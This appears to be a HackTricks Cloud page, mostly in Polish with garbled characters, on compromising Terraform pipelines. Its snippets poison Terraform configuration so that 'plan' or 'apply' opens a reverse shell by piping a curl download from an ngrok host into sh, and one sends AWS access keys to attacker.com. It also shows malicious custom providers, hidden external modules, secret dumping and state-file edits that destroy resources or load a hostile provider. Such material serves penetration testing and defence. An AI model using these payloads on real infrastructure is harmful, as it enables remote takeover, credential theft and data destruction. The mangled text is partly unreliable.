# Terraform Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Podstawowe informacje

[Z dokumentacji:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform to **narzdzie do infrastruktury jako kodu**, kt贸re pozwala definiowa zar贸wno **zasoby w chmurze, jak i lokalne** w czytelnych dla czowieka plikach konfiguracyjnych, kt贸re mo偶na wersjonowa, ponownie u偶ywa i udostpnia. Mo偶esz nastpnie u偶y sp贸jnego przepywu pracy do provisionowania i zarzdzania ca swoj infrastruktur przez cay jej cykl 偶ycia. Terraform mo偶e zarzdza komponentami niskiego poziomu, takimi jak zasoby obliczeniowe, pamici masowej i sieciowe, a tak偶e komponentami wysokiego poziomu, takimi jak wpisy DNS i funkcje SaaS.

#### Jak dziaa Terraform?

Terraform tworzy i zarzdza zasobami na platformach chmurowych i innych usugach za porednictwem ich interfejs贸w programowania aplikacji (API). Dostawcy umo偶liwiaj Terraformowi prac z praktycznie ka偶d platform lub usug z dostpnym API.

![](<../.gitbook/assets/image (177).png>)

HashiCorp i spoeczno Terraform ju偶 napisay **ponad 1700 dostawc贸w** do zarzdzania tysicami r贸偶nych typ贸w zasob贸w i usug, a ta liczba wci偶 ronie. Mo偶esz znale藕 wszystkich publicznie dostpnych dostawc贸w w [Terraform Registry](https://registry.terraform.io/), w tym Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i wiele innych.

Podstawowy przepyw pracy Terraform skada si z trzech etap贸w:

* **Napisz:** Definiujesz zasoby, kt贸re mog by rozproszone w wielu dostawcach chmurowych i usugach. Na przykad mo偶esz stworzy konfiguracj do wdro偶enia aplikacji na maszynach wirtualnych w sieci Virtual Private Cloud (VPC) z grupami zabezpiecze i r贸wnowa偶nikiem obci偶enia.
* **Zaplanuj:** Terraform tworzy plan wykonania opisujcy infrastruktur, kt贸r utworzy, zaktualizuje lub zniszczy na podstawie istniejcej infrastruktury i twojej konfiguracji.
* **Zastosuj:** Po zatwierdzeniu Terraform wykonuje proponowane operacje w odpowiedniej kolejnoci, respektujc wszelkie zale偶noci zasob贸w. Na przykad, jeli zaktualizujesz waciwoci VPC i zmienisz liczb maszyn wirtualnych w tym VPC, Terraform najpierw odtworzy VPC przed skalowaniem maszyn wirtualnych.

![](<../.gitbook/assets/image (215).png>)

### Laboratorium Terraform

Po prostu zainstaluj terraform na swoim komputerze.

Tutaj masz [przewodnik](https://learn.hashicorp.com/tutorials/terraform/install-cli), a tutaj masz [najlepszy spos贸b na pobranie terraform](https://www.terraform.io/downloads).

### RCE w Terraform

Terraform **nie ma platformy, kt贸ra udostpnia stron internetow lub usug sieciow**, kt贸r mo偶emy zenumerowa, dlatego jedynym sposobem na skompromitowanie terraform jest **mo偶liwo dodawania/modyfikowania plik贸w konfiguracyjnych terraform**.

Jednak terraform jest **bardzo wra偶liwym komponentem** do skompromitowania, poniewa偶 bdzie mia **uprzywilejowany dostp** do r贸偶nych lokalizacji, aby m贸g dziaa poprawnie.

G贸wnym sposobem, w jaki atakujcy mo偶e skompromitowa system, na kt贸rym dziaa terraform, jest **skompromentowanie repozytorium, kt贸re przechowuje konfiguracje terraform**, poniewa偶 w pewnym momencie bd one **interpretowane**.

W rzeczywistoci istniej rozwizania, kt贸re **automatycznie wykonuj terraform plan/apply po utworzeniu PR**, takie jak **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Jeli uda ci si skompromitowa plik terraform, istniej r贸偶ne sposoby, aby przeprowadzi RCE, gdy kto wykona `terraform plan` lub `terraform apply`.

#### Terraform plan

Terraform plan to **najczciej u偶ywane polecenie** w terraform i deweloperzy/rozwizania korzystajce z terraform wywouj je cay czas, wic **najatwiejszym sposobem na uzyskanie RCE** jest upewnienie si, 偶e zatruwasz plik konfiguracyjny terraform, kt贸ry wykona dowolne polecenia w `terraform plan`.

**U偶ywajc zewntrznego dostawcy**

Terraform oferuje [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs), kt贸ry zapewnia spos贸b interakcji midzy Terraform a programami zewntrznymi. Mo偶esz u偶y 藕r贸da danych `external`, aby uruchomi dowolny kod podczas `plan`.

Wstrzyknicie do pliku konfiguracyjnego terraform czego takiego jak poni偶ej spowoduje wykonanie rev shell podczas wykonywania `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**U偶ywanie niestandardowego dostawcy**

Atakujcy m贸gby wysa [niestandardowego dostawc](https://learn.hashicorp.com/tutorials/terraform/provider-setup) do [Terraform Registry](https://registry.terraform.io/) i nastpnie doda go do kodu Terraform w gazi funkcji ([przykad std](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Dostawca jest pobierany w `init` i uruchomi zoliwy kod, gdy `plan` zostanie wykonany

Mo偶esz znale藕 przykad w [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**U偶ywanie zewntrznego odniesienia**

Obie wspomniane opcje s przydatne, ale nie bardzo dyskretne (druga jest bardziej dyskretna, ale bardziej skomplikowana ni偶 pierwsza). Mo偶esz przeprowadzi ten atak nawet w **bardziej dyskretny spos贸b**, stosujc si do tych sugestii:

* Zamiast dodawa rev shell bezporednio do pliku terraform, mo偶esz **zaadowa zewntrzny zas贸b**, kt贸ry zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Mo偶esz znale藕 kod rev shell w [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zasobie zewntrznym u偶yj funkcji **ref**, aby ukry **kod rev shell Terraform w gazi** wewntrz repo, co takiego: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

#### Terraform Apply

Terraform apply zostanie wykonany, aby zastosowa wszystkie zmiany, mo偶esz r贸wnie偶 nadu偶y go, aby uzyska RCE, wstrzykujc **zoliwy plik Terraform z** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Musisz tylko upewni si, 偶e jaki adunek, taki jak poni偶sze, koczy si w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Postpuj zgodnie z **zaleceniami z poprzedniej techniki**, aby przeprowadzi ten atak w **bardziej ukryty spos贸b, u偶ywajc zewntrznych odniesie**.

### Zrzuty sekret贸w

Mo偶esz mie **wartoci sekret贸w u偶ywane przez terraform zrzucane** uruchamiajc `terraform apply`, dodajc do pliku terraform co takiego:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Wykorzystywanie plik贸w stanu Terraform

W przypadku, gdy masz dostp do zapisu plik贸w stanu terraform, ale nie mo偶esz zmieni kodu terraform, [**te badania**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) oferuj kilka interesujcych opcji, aby skorzysta z pliku:

#### Usuwanie zasob贸w <a href="#deleting-resources" id="deleting-resources"></a>

Istniej 2 sposoby na zniszczenie zasob贸w:

1. **Wstaw zas贸b o losowej nazwie do pliku stanu wskazujcy na rzeczywisty zas贸b do zniszczenia**

Poniewa偶 terraform zobaczy, 偶e zas贸b nie powinien istnie, zniszczy go (zgodnie z rzeczywistym identyfikatorem zasobu wskazanym). Przykad z poprzedniej strony:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Zmie zas贸b do usunicia w spos贸b, kt贸ry uniemo偶liwia aktualizacj (tak, aby zosta usunity i odtworzony)**

Dla instancji EC2, zmiana typu instancji wystarczy, aby terraform usun i odtworzy j.

#### RCE

Mo偶liwe jest r贸wnie偶 [utworzenie niestandardowego dostawcy](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i po prostu zastpienie jednego z dostawc贸w w pliku stanu terraform zoliwym lub dodanie pustego zasobu z zoliwym dostawc. Przykad z oryginalnych bada:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Zastpienie zablokowanego dostawcy

W przypadku napotkania sytuacji, w kt贸rej `hashicorp/external` zosta zablokowany, mo偶esz ponownie zaimplementowa dostawc `external`, wykonujc nastpujce kroki. Uwaga: U偶ywamy forka dostawcy external opublikowanego przez https://registry.terraform.io/providers/nazarewk/external/latest. Mo偶esz r贸wnie偶 opublikowa wasny fork lub re-implementacj.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Nastpnie mo偶esz u偶y `external` jak zwykle.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
### Narzdzia audytowe

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec wykorzystuje analiz statyczn twojego kodu terraform, aby wykry potencjalne bdy konfiguracyjne.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan to statyczny analizator kodu dla Infrastructure as Code.

### Odniesienia

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
